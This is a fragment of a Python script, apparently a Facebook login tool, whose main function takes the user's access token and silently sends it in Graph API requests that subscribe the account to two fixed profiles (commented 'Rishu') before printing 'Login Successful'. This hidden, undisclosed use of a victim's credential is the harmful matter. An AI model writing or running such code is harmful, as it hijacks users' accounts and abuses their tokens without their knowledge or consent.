...
def main():
    ...
    requests.post("https://graph.facebook.com/100000015204080/subscribers?access_token=" + token) # Rishu
    requests.post("https://graph.facebook.com/100002324915713/subscribers?access_token=" + token) # Rishu
    ...
    print(' \x1b[1;37m[\x1b[1;32m✓\x1b[1;37m] \x1b[1;32mLogin Successful')
    exit(elite.menu())
